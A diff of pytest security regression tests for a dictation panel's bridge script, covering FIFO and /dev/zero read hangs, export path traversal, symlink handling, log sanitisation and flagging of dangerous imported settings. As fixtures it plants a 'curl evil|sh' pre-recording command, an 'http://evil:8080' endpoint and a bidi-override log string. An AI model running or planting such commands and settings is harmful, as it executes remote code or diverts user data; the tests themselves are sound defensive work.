@@ -10,9 +10,11 @@ Run:  /usr/bin/python3 -m pytest -q tests/test_bridge.py
 """
 from __future__ import annotations
 
+import contextlib
 import json
 import os
 import re
+import resource
 import signal
 import subprocess
 import sys
@@ -119,6 +121,14 @@ if a[:1] == ["setup"]:
         sys.stdout.flush()
         if name == "broken":
             sys.stdout.write("curl: (22) The requested URL returned error: 404\n")
+            sys.stdout.flush()
+            sys.exit(1)
+        if name == "hostile":
+            # A child that tries to push control characters, a bidi
+            # override and a wall of text into the panel's log tail.
+            sys.stdout.write(
+                "start\u202egnidaolnwod\u0007 " + ("A" * 4000) + "\n"
+            )
             sys.stdout.flush()
             sys.exit(1)
         for pct in ("12.5", "50.0", "87.5"):
@@ -781,6 +791,136 @@ def test_status_reports_helper_availability(env: Env):
 
 
 # ---------------------------------------------------------------------------
+# F3: the state file is config-controlled and polled every 2 s
+# ---------------------------------------------------------------------------
+
+
+@contextlib.contextmanager
+def memory_ceiling(mib: int, what: str):
+    """Hard address-space limit for a block that must never allocate much.
+
+    The bugs these tests pin are *memory bombs*: unbounded reads of
+    /dev/zero, /dev/urandom or a growing file. `deadline` below only
+    catches a block that never returns — an unbounded read returns just
+    fine, after eating every byte of RAM. Running the suite against
+    unfixed code once drove pytest to 39 GiB RSS and got the whole
+    session OOM-killed, so the ceiling is part of the test, not a
+    convenience: a regression must fail this process, not the machine.
+
+    RLIMIT_AS makes the runaway allocation raise MemoryError inside the
+    bridge instead, which `fail()` reports as an ordinary error. The
+    limit is restored on exit so later tests keep the full heap.
+    """
+    soft, hard = resource.getrlimit(resource.RLIMIT_AS)
+    ceiling = mib * 1024 * 1024
+    if hard != resource.RLIM_INFINITY and hard < ceiling:
+        ceiling = hard
+    resource.setrlimit(resource.RLIMIT_AS, (ceiling, hard))
+    try:
+        yield
+    except MemoryError as e:  # pragma: no cover - only on a regression
+        raise AssertionError(
+            f"{what} allocated past {mib} MiB; the read is not bounded"
+        ) from e
+    finally:
+        resource.setrlimit(resource.RLIMIT_AS, (soft, hard))
+
+
+@contextlib.contextmanager
+def deadline(seconds: float, what: str):
+    """Hard wall-clock limit for a block that must never block.
+
+    Uses SIGALRM rather than pytest-timeout so the suite keeps running on
+    a bare `pytest` install: a regression fails loudly instead of hanging
+    CI forever, which is the whole point of the FIFO tests below.
+    """
+    def fire(_signum, _frame):
+        raise AssertionError(f"{what} did not return within {seconds}s")
+
+    previous = signal.signal(signal.SIGALRM, fire)
+    signal.setitimer(signal.ITIMER_REAL, seconds)
+    try:
+        yield
+    finally:
+        signal.setitimer(signal.ITIMER_REAL, 0)
+        signal.signal(signal.SIGALRM, previous)
+
+
+def test_read_state_word_does_not_block_on_fifo(tmp_path: Path):
+    """F3 regression: a FIFO at state_file used to hang the bridge forever.
+
+    `status` polls this every 2 s while the panel is open, so each hung
+    read leaked a process inside omarchy-shell. The timeout makes a
+    regression fail loudly instead of hanging CI.
+    """
+    fifo = tmp_path / "state"
+    os.mkfifo(fifo)
+    with deadline(10, "_read_state_word on a FIFO"):
+        assert bridge._read_state_word(fifo) is None
+
+
+def test_status_does_not_block_on_fifo_state_file(env: Env):
+    """The same guard through the real `status` op, with the FIFO named
+    by config exactly as an attacker-supplied bundle would name it."""
+    fifo = env.root / "fifo-state"
+    os.mkfifo(fifo)
+    env.write_config(BASE_CONFIG.replace('state_file = "auto"', f'state_file = "{fifo}"'))
+    env.daemon(active=True)
+    with deadline(15, "status with a FIFO state_file"):
+        res = env.ok("status")
+    assert res["state_file_path"] == str(fifo)
+    assert res["daemon"]["ready"] is False
+    assert res["daemon"]["state"] == "idle"
+
+
+def test_wait_for_daemon_ready_does_not_block_on_fifo(env: Env):
+    """The 0.15 s poll loop calls the same helper up to 400 times."""
+    fifo = env.root / "fifo-state"
+    os.mkfifo(fifo)
+    started = time.monotonic()
+    with deadline(15, "_wait_for_daemon_ready on a FIFO"):
+        assert bridge._wait_for_daemon_ready(fifo, timeout=0.5) is False
+    elapsed = time.monotonic() - started
+    # It really polled for the whole timeout rather than erroring out.
+    assert 0.4 < elapsed < 5.0, elapsed
+
+
+def test_read_state_word_rejects_non_regular_files(tmp_path: Path):
+    """Directories, symlinks and devices are not the daemon's state file."""
+    d = tmp_path / "adir"
+    d.mkdir()
+    assert bridge._read_state_word(d) is None
+
+    real = tmp_path / "real"
+    real.write_text("recording\n")
+    link = tmp_path / "link"
+    link.symlink_to(real)
+    # O_NOFOLLOW: a symlink at the configured path is refused outright.
+    assert bridge._read_state_word(link) is None
+    assert bridge._read_state_word(real) == "recording"
+
+    assert bridge._read_state_word(tmp_path / "missing") is None
+
+    dev = Path("/dev/zero")
+    if dev.exists():
+        # Unfixed, this read is unbounded: cap the heap so a regression
+        # fails the test instead of OOM-killing the session.
+        with memory_ceiling(512, "_read_state_word on /dev/zero"):
+            with deadline(20, "_read_state_word on /dev/zero"):
+                assert bridge._read_state_word(dev) is None
+
+
+def test_read_state_word_is_size_capped(tmp_path: Path):
+    """A regular file is still only read up to the cap."""
+    big = tmp_path / "state"
+    big.write_bytes(b"x" * (5 * 1024 * 1024))
+    word = bridge._read_state_word(big)
+    assert word is not None
+    assert len(word) <= bridge.MAX_STATE_WORD_BYTES
+    assert bridge.MAX_STATE_WORD_BYTES <= 256
+
+
+# ---------------------------------------------------------------------------
 # load / options / models.list / gpu.status / dictionary.preview
 # ---------------------------------------------------------------------------
 
@@ -1248,8 +1388,8 @@ def test_export_preview(env: Env):
 
 def test_export_write_redacts_secrets_by_default(env: Env):
     _seed(env)
-    target = env.root / "out" / "bundle.json"
-    target.parent.mkdir()
+    target = env.home / "out" / "bundle.json"
+    target.parent.mkdir(parents=True)
     res = env.ok("export.write", path=str(target), scope="sync")
     assert res["path"] == str(target) and res["bytes"] == target.stat().st_size
     bundle = json.loads(target.read_text())
@@ -1261,7 +1401,7 @@ def test_export_write_redacts_secrets_by_default(env: Env):
 
 def test_export_write_with_secrets_and_local(env: Env):
     _seed(env)
-    target = env.root / "full.json"
+    target = env.home / "full.json"
     env.ok("export.write", path=str(target), scope="sync+local", include_secrets=True)
     bundle = json.loads(target.read_text())
     assert bundle["secrets"]["whisper"]["remote_api_key"] == "sk-SECRET"
@@ -1272,7 +1412,48 @@ def test_export_write_default_path_and_bad_parent(env: Env):
     res = env.ok("export.write")
     assert res["path"].startswith(str(env.home / "Downloads"))
     assert Path(res["path"]).exists()
-    env.fail("export.write", path=str(env.root / "no" / "such" / "dir" / "x.json"))
+    env.fail("export.write", path=str(env.home / "no" / "such" / "dir" / "x.json"))
+
+
+def test_export_write_refuses_outside_home(env: Env):
+    """F6 regression: the panel sends a user-typed path straight through.
+
+    Unconstrained, a bar widget could write a JSON file anywhere the
+    user can — including over a dotfile via a traversal string.
+    """
+    _seed(env)
+    outside = env.root / "escaped.json"
+    res = env.fail("export.write", path=str(outside))
+    assert "home directory" in res["error"]
+    assert not outside.exists()
+
+    traversal = env.home / ".." / "traversed.json"
+    res = env.fail("export.write", path=str(traversal))
+    assert "home directory" in res["error"]
+    assert not (env.root / "traversed.json").exists()
+
+
+def test_export_write_requires_a_json_suffix(env: Env):
+    _seed(env)
+    target = env.home / "bundle.txt"
+    res = env.fail("export.write", path=str(target))
+    assert ".json" in res["error"]
+    assert not target.exists()
+
+
+def test_export_write_replaces_a_symlink_instead_of_following_it(env: Env):
+    """The atomic mkstemp+os.replace write must not write THROUGH a link."""
+    _seed(env)
+    secret = env.home / "unrelated.txt"
+    secret.write_text("do not touch")
+    link = env.home / "bundle.json"
+    link.symlink_to(secret)
+
+    env.ok("export.write", path=str(link), scope="sync")
+
+    assert secret.read_text() == "do not touch"
+    assert not link.is_symlink()
+    assert json.loads(link.read_text())["sync"]["vocabulary"][0]["phrase"] == "Omarchy"
 
 
 def _bundle(env: Env, *, settings: dict | None = None, local: dict | None = None,
@@ -1295,7 +1476,7 @@ def test_import_preview_diff(env: Env):
     env.ok("vocab.add", phrase="Omarchy")
     p = _bundle(env, settings={"output": {"mode": "clipboard"}, "whisper": {"remote_endpoint": "http://evil:8080"}},
                 local={"hotkey": {"key": "F24"}})
-    res = env.ok("import.preview", path=str(p))
+    res = env.ok("import.preview", path=str(p), include_settings=True)
     assert res["format"] == "voxtype-tui"
     assert res["source"] == "other-box"
     assert res["has_local"] is True and res["include_local"] is False
@@ -1307,13 +1488,13 @@ def test_import_preview_diff(env: Env):
     assert changes["whisper.remote_endpoint"]["dangerous"] is True
     assert res["dangerous"] == ["whisper.remote_endpoint"]
     assert "hotkey.key" not in changes
-    res = env.ok("import.preview", path=str(p), include_local=True)
+    res = env.ok("import.preview", path=str(p), include_local=True, include_settings=True)
     assert {c["path"] for c in res["diff"]["settings_change"]} >= {"hotkey.key"}
 
 
 def test_import_preview_filters_uninstalled_model(env: Env):
     p = _bundle(env, settings={"whisper": {"model": "large-v3"}})
-    res = env.ok("import.preview", path=str(p))
+    res = env.ok("import.preview", path=str(p), include_settings=True)
     assert not any(c["path"] == "whisper.model" for c in res["diff"]["settings_change"])
     assert any("not installed" in w for w in res["warnings"])
 
@@ -1356,14 +1537,88 @@ def test_import_preview_refuses_oversize_file_without_reading_it(env: Env, monke
     assert "limit" in res["error"]
 
 
+def test_import_refuses_non_regular_files(env: Env):
+    """F5 regression: st_size is 0 for character devices and procfs, so
+    the size gate waved them through and read_bytes() then allocated
+    until MemoryError. The audit confirmed /dev/zero and /dev/urandom.
+    """
+    for candidate in ("/dev/zero", "/dev/urandom"):
+        dev = Path(candidate)
+        if not dev.exists():
+            continue
+        assert dev.stat().st_size == 0  # why the size gate alone was useless
+        with memory_ceiling(512, f"import.preview on {candidate}"):
+            with deadline(20, f"import.preview on {candidate}"):
+                res = env.fail("import.preview", path=candidate)
+        assert "regular file" in res["error"]
+        with memory_ceiling(512, f"import.apply on {candidate}"):
+            with deadline(20, f"import.apply on {candidate}"):
+                res = env.fail("import.apply", path=candidate, accept_dangerous=True)
+        assert "regular file" in res["error"]
+
+
+def test_import_refuses_a_fifo_without_hanging(env: Env):
+    """A FIFO also stats at size 0, and reading it blocks forever."""
+    fifo = env.root / "bundle.fifo"
+    os.mkfifo(fifo)
+    with deadline(20, "import.preview on a FIFO"):
+        res = env.fail("import.preview", path=str(fifo))
+    assert "regular file" in res["error"]
+    with deadline(20, "import.apply on a FIFO"):
+        res = env.fail("import.apply", path=str(fifo), accept_dangerous=True)
+    assert "regular file" in res["error"]
+
+
+def test_import_refuses_a_directory(env: Env):
+    d = env.root / "adir"
+    d.mkdir()
+    assert env.fail("import.preview", path=str(d))["error"]
+
+
+def test_import_read_is_bounded_not_just_stat_gated(env: Env, monkeypatch):
+    """The read itself is capped, not just the pre-read stat.
+
+    st_size is only a hint — it is 0 for devices and stale for a file
+    that grows after the stat. Here stat reports a small size for a file
+    that is actually 3 MB: the old code trusted it and pulled the whole
+    thing in with read_bytes(), the fixed code reads at most the cap + 1
+    byte and refuses.
+    """
+    from voxtype_tui import sync
+
+    p = env.root / "liar.json"
+    p.write_bytes(b"{" + b" " * (3 * sync.MAX_BUNDLE_BYTES))
+
+    real_stat = Path.stat
+
+    class _SmallStat:
+        def __init__(self, st):
+            self.st_mode = st.st_mode
+            self.st_size = 10
+
+    def lying_stat(self, *a, **k):
+        st = real_stat(self, *a, **k)
+        return _SmallStat(st) if self == p else st
+
+    def no_read_bytes(self, *a, **k):
+        raise AssertionError(f"unbounded read_bytes() on {self}")
+
+    monkeypatch.setattr(Path, "stat", lying_stat)
+    monkeypatch.setattr(Path, "read_bytes", no_read_bytes)
+
+    with memory_ceiling(512, "import.preview on a file that lies about its size"):
+        res = env.fail("import.preview", path=str(p))
+    assert str(sync.MAX_BUNDLE_BYTES) in res["error"]
+
+
 def test_import_apply_refuses_dangerous_unless_accepted(env: Env):
     p = _bundle(env, settings={"whisper": {"remote_endpoint": "http://evil:8080"}})
     before = env.read_config()
-    res = env.fail("import.apply", path=str(p))
+    res = env.fail("import.apply", path=str(p), include_settings=True)
     assert res["error"] == "dangerous-changes"
     assert res["dangerous"] == ["whisper.remote_endpoint"]
     assert env.read_config() == before
-    res = env.ok("import.apply", path=str(p), accept_dangerous=True)
+    res = env.ok("import.apply", path=str(p), include_settings=True, accept_dangerous=True)
     assert env.config_dict()["whisper"]["remote_endpoint"] == "http://evil:8080"
     assert "whisper.remote_endpoint" in res["restart_needed"]
 
@@ -1371,7 +1626,7 @@ def test_import_apply_refuses_dangerous_unless_accepted(env: Env):
 def test_import_apply_merges(env: Env):
     env.ok("vocab.add", phrase="Omarchy")
     p = _bundle(env, settings={"output": {"mode": "clipboard"}}, local={"hotkey": {"key": "F24"}})
-    res = env.ok("import.apply", path=str(p))
+    res = env.ok("import.apply", path=str(p), include_settings=True)
     snap = res["snapshot"]
     assert [v["phrase"] for v in snap["vocabulary"]] == ["Omarchy", "Hyprland"]
     assert snap["replacements"] == [{"from": "hyper land", "to": "Hyprland", "category": "Capitalization"}]
@@ -1381,7 +1636,7 @@ def test_import_apply_merges(env: Env):
     cfg = env.config_dict()
     assert cfg["whisper"]["initial_prompt"] == "Omarchy, Hyprland"
     assert cfg["text"]["replacements"] == {"hyper land": "Hyprland"}
-    res = env.ok("import.apply", path=str(p), include_local=True)
+    res = env.ok("import.apply", path=str(p), include_local=True, include_settings=True)
     assert res["snapshot"]["settings"]["hotkey.key"] == "F24"
 
 
@@ -1392,10 +1647,176 @@ def test_import_apply_can_skip_settings(env: Env):
     assert res["applied"]["settings_change"] == []
 
 
+def test_import_include_settings_defaults_to_false(env: Env):
+    """F1: the bridge must NOT import settings unless asked.
+
+    voxtype_tui's own import screen defaults this OFF and calls that
+    default the contract that protects users from silent overwrites; the
+    bridge used to invert it, so a caller that omitted the flag silently
+    took every setting from an untrusted bundle.
+    """
+    p = _bundle(env, settings={"output": {"mode": "clipboard"}})
+    before = env.read_config()
+
+    # Default (flag absent): preview shows no settings rows at all.
+    pv = env.ok("import.preview", path=str(p))
+    assert pv["diff"]["settings_change"] == []
+
+    # Default (flag absent): apply writes no settings.
+    res = env.ok("import.apply", path=str(p))
+    assert res["applied"]["settings_change"] == []
+    assert res["snapshot"]["settings"]["output.mode"] == "type"
+    assert 'mode = "type"' in env.read_config()
+    assert 'mode = "clipboard"' not in env.read_config()
+
+    # Explicit false behaves the same.
+    assert env.ok("import.preview", path=str(p), include_settings=False)["diff"]["settings_change"] == []
+
+    # Explicit true is the only way settings move.
+    env.write_config(before)
+    pv = env.ok("import.preview", path=str(p), include_settings=True)
+    assert [c["path"] for c in pv["diff"]["settings_change"]] == ["output.mode"]
+    res = env.ok("import.apply", path=str(p), include_settings=True)
+    assert res["snapshot"]["settings"]["output.mode"] == "clipboard"
+
+
 def test_redacted_import_paths_match_tui():
     from voxtype_tui import sync
 
     assert bridge.REDACTED_IMPORT_PATHS == {".".join(p) for p in sync.SECRET_PATHS}
+
+
+def test_bridge_dangerous_paths_superset_of_tui():
+    """F2: the plugin owns its own dangerous set, upstream can only widen it.
+
+    voxtype_tui.sync.DANGEROUS_PATHS covers only the four SECRET_PATHS
+    plus whisper.remote_endpoint. Everything else an attacker-supplied
+    bundle can weaponise (the pre_recording hook, engine/mode switches,
+    the state file, file-output sink, meeting capture) must be flagged by
+    this plugin regardless of what upstream does.
+    """
+    from voxtype_tui import sync
+
+    upstream = {".".join(p) for p in sync.DANGEROUS_PATHS}
+    union = bridge._dangerous_setting_paths()
+    assert union >= upstream, upstream - union
+    assert union >= bridge.BRIDGE_DANGEROUS_PATHS
+    # The specific gaps this fix closes.
+    for path in (
+        "output.pre_recording_command", "engine", "whisper.mode", "state_file",
+        "output.file_path", "output.file_mode",
+        "meeting.retain_audio", "meeting.storage_path",
+        "soniox.api_key", "cohere.api_key",
+    ):
+        assert path in union, path
+        assert path not in upstream or path in bridge.BRIDGE_DANGEROUS_PATHS
+
+
+@pytest.mark.parametrize("planted,expected", [
+    ({"output": {"pre_recording_command": "bash -c 'curl evil|sh'"}},
+     ["output.pre_recording_command"]),
+    ({"engine": "moonshine"}, ["engine"]),
+    ({"whisper": {"mode": "remote"}}, ["whisper.mode"]),
+    ({"state_file": "/tmp/attacker-state"}, ["state_file"]),
+    ({"output": {"file_path": "/tmp/pwn.txt", "file_mode": "overwrite"}},
+     ["output.file_path", "output.file_mode"]),
+    ({"meeting": {"retain_audio": True, "storage_path": "/tmp/loot"}},
+     ["meeting.retain_audio", "meeting.storage_path"]),
+])
+def test_import_flags_bridge_dangerous_paths(env: Env, planted: dict, expected: list):
+    """F2 regression: these used to come back dangerous==[] and apply clean.
+
+    Before the fix, a bundle planting any of these applied SILENTLY: the
+    preview reported no dangerous rows, import.apply succeeded without
+    accept_dangerous, and the value landed in config.toml.
+    """
+    p = _bundle(env, settings=planted)
+    before = env.read_config()
+
+    pv = env.ok("import.preview", path=str(p), include_settings=True)
+    for path in expected:
+        assert path in pv["dangerous"], (path, pv["dangerous"])
+        row = next(c for c in pv["diff"]["settings_change"] if c["path"] == path)
+        assert row["dangerous"] is True
+        # C4: non-redacted rows keep old/new so the panel can render them.
+        if not row.get("redacted"):
+            assert "old" in row and "new" in row
+
+    # C3: refusal is live and writes NOTHING.
+    res = env.fail("import.apply", path=str(p), include_settings=True)
+    assert res["error"] == "dangerous-changes"
+    assert set(expected) <= set(res["dangerous"])
+    assert "diff" in res and "warnings" in res
+    assert env.read_config() == before
+    assert not env.sidecar.exists() or "pre_recording_command" not in env.sidecar.read_text()
+
+    # Only an explicit accept_dangerous lets it through.
+    ok = env.ok("import.apply", path=str(p), include_settings=True, accept_dangerous=True)
+    assert set(expected) <= {c["path"] for c in ok["applied"]["settings_change"]}
+
+
+def test_import_apply_refusal_shape(env: Env):
+    """C3: the refusal payload the QML lane renders."""
+    p = _bundle(env, settings={"output": {"pre_recording_command": "evil"}})
+    res = env.fail("import.apply", path=str(p), include_settings=True)
+    assert set(res) == {"ok", "error", "dangerous", "diff", "warnings"}
+    assert res["ok"] is False and res["error"] == "dangerous-changes"
+    assert res["dangerous"] == ["output.pre_recording_command"]
+    assert isinstance(res["diff"]["settings_change"], list)
+    assert isinstance(res["warnings"], list)
+    # accept_dangerous still defaults to False (C3): an explicit false
+    # and an absent flag behave identically.
+    assert env.fail("import.apply", path=str(p), include_settings=True,
+                    accept_dangerous=False)["error"] == "dangerous-changes"
+
+
+def test_every_settings_row_is_json_safe(env: Env):
+    """C4: the panel renders every row, so old/new must survive json.dumps."""
+    p = _bundle(env, settings={
+        "output": {"mode": "clipboard", "type_delay_ms": 7, "fallback_to_clipboard": False},
+        "whisper": {"language": "fr"},
+        "audio": {"feedback": {"volume": 0.25}},
+    })
+    res = env.ok("import.preview", path=str(p), include_settings=True)
+    rows = res["diff"]["settings_change"]
+    assert rows
+    for row in rows:
+        if row.get("redacted"):
+            assert set(row) == {"path", "dangerous", "redacted", "old_set", "new_set"}
+            assert "old" not in row and "new" not in row
+        else:
+            assert set(row) == {"path", "old", "new", "dangerous"}
+            json.dumps(row)  # raises on a tomlkit wrapper leaking through
+            for v in (row["old"], row["new"]):
+                assert v is None or isinstance(v, (str, int, float, bool, list, dict))
+
+
+def test_design_documents_secret_emission_accurately(env: Env):
+    """C5: DESIGN.md used to claim the bridge never emits the values of
+    all four REDACTED_IMPORT_PATHS. That was false — the user's own
+    post_process/pre/post-output commands ARE in the load snapshot. The
+    doc must describe what the code actually does.
+    """
+    design = (REPO / "docs" / "DESIGN.md").read_text()
+    assert bridge.SECRET_SETTINGS == {"whisper.remote_api_key"}
+
+    # The snapshot really does carry the shell-hook values ...
+    env.ok("settings.set", path="output.post_process.command", value="tr a-z A-Z")
+    snap = env.ok("load")["snapshot"]["settings"]
+    assert snap["output.post_process.command"] == "tr a-z A-Z"
+    # ... and really does not carry the API key.
+    env.set_api_key("sk-NEVER-EMITTED")
+    snap = env.ok("load")["snapshot"]["settings"]
+    assert "whisper.remote_api_key" not in snap
+    assert snap["whisper.remote_api_key_set"] is True
+    assert "sk-NEVER-EMITTED" not in json.dumps(env.ok("load"))
+    assert "sk-NEVER-EMITTED" not in json.dumps(env.ok("status"))
+
+    # So the doc must scope the never-emit claim to the API key and scope
+    # the redaction claim to import diff rows.
+    assert "Only `whisper.remote_api_key` is **never** emitted" in design
+    assert "in import diff rows specifically" in design
+    assert "bridge never emits their values in any response" not in design
 
 
 def test_import_preview_and_apply_never_leak_secret_values(env: Env):
@@ -1520,6 +1941,46 @@ def test_design_documents_restart_timeout():
     assert "timeout:18" in design or "timeout: 18" in design
 
 
+def test_daemon_restart_worst_case_fits_the_qml_deadline():
+    """F7 regression: the op's worst case must stay inside QML's deadline.
+
+    daemon.restart runs `systemctl --user restart voxtype` (blocking, up
+    to SYSTEMCTL_RESTART_TIMEOUT) and only THEN waits for readiness, so
+    the worst case is the sum. Service.qml arms one deadline for the
+    whole round trip and SIGKILLs the bridge when it expires — with the
+    old 30 s deadline against a 15 + 18 s worst case, a restart that had
+    actually succeeded was reported to the user as a timeout.
+
+    This is the bridge half of a contract whose other half is in
+    Service.qml; the QML suite pins the same numbers from that side.
+    """
+    worst_case = bridge.SYSTEMCTL_RESTART_TIMEOUT + bridge.DAEMON_RESTART_READY_TIMEOUT
+    assert worst_case < bridge.QML_DAEMON_RESTART_DEADLINE, (
+        f"daemon.restart can take {worst_case}s but QML gives up after "
+        f"{bridge.QML_DAEMON_RESTART_DEADLINE}s"
+    )
+
+
+def test_systemctl_restart_timeout_matches_upstream():
+    """SYSTEMCTL_RESTART_TIMEOUT mirrors a number owned by voxtype_tui.
+
+    If upstream raises its subprocess timeout, our worst-case arithmetic
+    silently understates the real budget, so read it back from the
+    installed package rather than hard-coding a guess.
+    """
+    from voxtype_tui import voxtype_cli
+
+    source = Path(voxtype_cli.__file__).read_text()
+    m = re.search(
+        r'"restart",\s*"voxtype"\s*\][^)]*?timeout=(\d+(?:\.\d+)?)',
+        source,
+        re.S,
+    )
+    if m is None:
+        pytest.skip("upstream restart_daemon no longer matches the known shape")
+    assert float(m.group(1)) <= bridge.SYSTEMCTL_RESTART_TIMEOUT
+
+
 def test_daemon_restart_without_systemctl(env: Env):
     env.remove_fake("systemctl")
     res = env.call("daemon.restart")
@@ -1641,6 +2102,120 @@ def test_download_rejects_bad_arguments(env: Env):
     assert env.voxtype_calls() == []
 
 
+def test_download_log_lines_are_capped_and_stripped(env: Env):
+    """F8 regression: LOG relays the child's stdout into a rendered row.
+
+    voxtype is a separate binary; whatever it prints during a download
+    reaches the panel's log tail. A verbose or tampered-with build must
+    not be able to push control characters, a bidi override or a wall of
+    text through that channel.
+    """
+    r = env.run_cli(None, "--download", "whisper", "hostile")
+    assert r.returncode == 1
+    logs = [l[len("LOG "):] for l in r.stdout.splitlines() if l.startswith("LOG ")]
+    assert logs, r.stdout
+    for body in logs:
+        assert len(body) <= bridge.MAX_DOWNLOAD_LOG_CHARS, len(body)
+        assert "\u202e" not in body
+        assert "\u0007" not in body
+    # The line survived, it was just bounded and cleaned.
+    assert any(body.startswith("start") for body in logs), logs
+
+
+def test_log_control_filter_drops_the_whole_class():
+    """The stripped set matches the QML sanitizer's, minus line breaks.
+
+    A LOG line is one row, so \\n and \\r are flattened by the .strip()
+    and the split; the invisible formatters are what must never survive.
+    """
+    for ch in ("\u0000", "\u0007", "\u001b", "\u007f", "\u200e", "\u202e",
+               "\u2066", "\u2069", "\u2028", "\u2029"):
+        assert bridge._LOG_CONTROL_RE.sub("", f"a{ch}b") == "ab", repr(ch)
+    assert bridge._LOG_CONTROL_RE.sub("", "plain text") == "plain text"
+
+
+# ---------------------------------------------------------------------------
+# helpers that the op-level tests only reached indirectly
+# ---------------------------------------------------------------------------
+
+
+def test_parse_systemd_timestamp():
+    ts = bridge._parse_systemd_timestamp("Thu 2026-09-10 16:40:12 CEST")
+    assert ts is not None
+    assert time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(ts)) == "2026-09-10 16:40:12"
+    # systemd prints this for a unit that has never run.
+    assert bridge._parse_systemd_timestamp("n/a") is None
+    assert bridge._parse_systemd_timestamp("") is None
+    assert bridge._parse_systemd_timestamp("Thu not-a-date 16:40:12 CEST") is None
+    assert bridge._parse_systemd_timestamp("Thu 2026-02-30 16:40:12 CEST") is None
+
+
+def test_count_leaves():
+    assert bridge._count_leaves({}) == 0
+    assert bridge._count_leaves({"a": 1}) == 1
+    assert bridge._count_leaves({"a": {"b": 1, "c": 2}, "d": 3}) == 3
+    # A list is one leaf, not its length: settings values are scalars or
+    # arrays, and an array is edited as a unit.
+    assert bridge._count_leaves({"a": [1, 2, 3]}) == 1
+    assert bridge._count_leaves({"a": {"b": {"c": {"d": 1}}}}) == 1
+
+
+def test_strip_ansi():
+    assert bridge._strip_ansi("\x1b[31mError:\x1b[0m failed") == "Error: failed"
+    assert bridge._strip_ansi("plain") == "plain"
+    assert bridge._strip_ansi("") == ""
+    assert bridge._strip_ansi("\x1b[1;32mbold green\x1b[0m") == "bold green"
+
+
+def test_model_present(tmp_path: Path):
+    missing = tmp_path / "nope.bin"
+    assert bridge._model_present(missing) is False
+
+    empty = tmp_path / "empty.bin"
+    empty.touch()
+    assert bridge._model_present(empty) is False
+
+    real = tmp_path / "model.bin"
+    real.write_bytes(b"x" * 16)
+    assert bridge._model_present(real) is True
+
+    empty_dir = tmp_path / "emptydir"
+    empty_dir.mkdir()
+    assert bridge._model_present(empty_dir) is False
+
+    nested = tmp_path / "dirmodel"
+    (nested / "inner").mkdir(parents=True)
+    (nested / "inner" / "weights").write_bytes(b"x")
+    assert bridge._model_present(nested) is True
+
+
+def test_encode_response_rejects_unserialisable_values():
+    """The too-large branch was covered; the TypeError branch was not."""
+    out = bridge.encode_response({"ok": True, "value": {1, 2, 3}})
+    decoded = json.loads(out)
+    assert decoded["ok"] is False
+    assert "unserialisable response" in decoded["error"]
+
+    class Boom:
+        def __repr__(self):  # pragma: no cover - exercised via json.dumps
+            return "<boom>"
+
+    decoded = json.loads(bridge.encode_response({"ok": True, "v": Boom()}))
+    assert decoded["ok"] is False and "unserialisable" in decoded["error"]
+
+    # A normal response still round-trips untouched.
+    assert json.loads(bridge.encode_response({"ok": True, "n": 1})) == {"ok": True, "n": 1}
+
+
+def test_encode_response_too_large_names_the_op():
+    big = {"ok": True, "op": "models.list", "blob": "x" * (bridge.MAX_RESPONSE_BYTES + 10)}
+    decoded = json.loads(bridge.encode_response(big))
+    assert decoded["ok"] is False
+    assert decoded["error"] == "response too large"
+    assert decoded["op"] == "models.list"
+    assert decoded["limit_bytes"] == bridge.MAX_RESPONSE_BYTES
+
+
 def test_download_without_binary(env: Env):
     env.remove_fake("voxtype")
     r = env.run_cli(None, "--download", "whisper", "tiny")
@@ -1730,3 +2305,92 @@ def test_write_ops_set_matches_dispatch_table():
 
     mutating = {op for op in bridge.OPS if op.split(".")[0] in {"vocab", "dict", "settings", "models", "gpu"} or op == "import.apply"}
     assert bridge.WRITE_OPS == mutating - {"models.list", "gpu.status"}
+
+
+# ---------------------------------------------------------------------------
+# F4: the lock probe runs on every write op and every status
+# ---------------------------------------------------------------------------
+
+
+def test_tui_lock_holder_does_not_block_on_fifo(env: Env):
+    """F4 regression: os.open(lock, O_RDONLY) blocks forever on a FIFO.
+
+    This probe fires on every write op and every status poll, so a FIFO
+    at the lock path wedged the panel completely.
+    """
+    lock = env.sidecar.parent / ".lock"
+    lock.parent.mkdir(parents=True, exist_ok=True)
+    os.mkfifo(lock)
+    paths = bridge._paths()
+    assert paths.lock == lock
+
+    with deadline(10, "tui_lock_holder on a FIFO"):
+        assert bridge.tui_lock_holder(paths) is None
+    # The op layer must stay usable too, not just the helper.
+    with deadline(15, "status with a FIFO lock file"):
+        assert env.ok("status")["tui_open_pid"] is None
+    with deadline(15, "a write op with a FIFO lock file"):
+        assert env.ok("vocab.add", phrase="Omarchy")["ok"] is True
+
+
+def test_tui_lock_holder_refuses_a_symlinked_lock(env: Env):
+    """O_NOFOLLOW: the probe must not be redirected to another file.
+
+    Without O_NOFOLLOW the probe follows the link and reports the holder
+    of whatever file it points at, so a symlink planted at the lock path
+    can make the panel believe the TUI is open and refuse every write.
+    """
+    import fcntl as _fcntl
+
+    target = env.root / "elsewhere"
+    target.write_text(f"{os.getpid()}\n")
+    lock = env.sidecar.parent / ".lock"
+    lock.parent.mkdir(parents=True, exist_ok=True)
+    lock.symlink_to(target)
+
+    fd = os.open(target, os.O_RDWR)
+    try:
+        _fcntl.flock(fd, _fcntl.LOCK_EX | _fcntl.LOCK_NB)
+        # Following the link would report os.getpid() here.
+        assert bridge.tui_lock_holder(bridge._paths()) is None
+        assert env.ok("status")["tui_open_pid"] is None
+        # ... and writes stay available rather than being wedged shut.
+        assert env.ok("vocab.add", phrase="Omarchy")["ok"] is True
+    finally:
+        os.close(fd)
+
+
+def test_tui_lock_holder_ignores_a_directory_at_the_lock_path(env: Env):
+    lock = env.sidecar.parent / ".lock"
+    lock.mkdir(parents=True)
+    assert bridge.tui_lock_holder(bridge._paths()) is None
+    assert env.ok("status")["tui_open_pid"] is None
+
+
+def test_tui_lock_holder_reports_holder_and_absence(env: Env):
+    """F9 coverage: the helper had no direct unit test at all."""
+    paths = bridge._paths()
+    # Nothing there yet.
+    assert bridge.tui_lock_holder(paths) is None
+    # Stale file, no flock.
+    paths.lock.parent.mkdir(parents=True, exist_ok=True)
+    paths.lock.write_text("424242\n")
+    assert bridge.tui_lock_holder(paths) is None
+    # Real holder.
+    lock, fd = _hold_tui_lock(env)
+    try:
+        assert bridge.tui_lock_holder(paths) == os.getpid()
+    finally:
+        os.close(fd)
+    assert bridge.tui_lock_holder(paths) is None
+    # Held but the file carries no readable PID -> -1 ("unknown holder").
+    import fcntl as _fcntl
+
+    fd2 = os.open(lock, os.O_RDWR)
+    try:
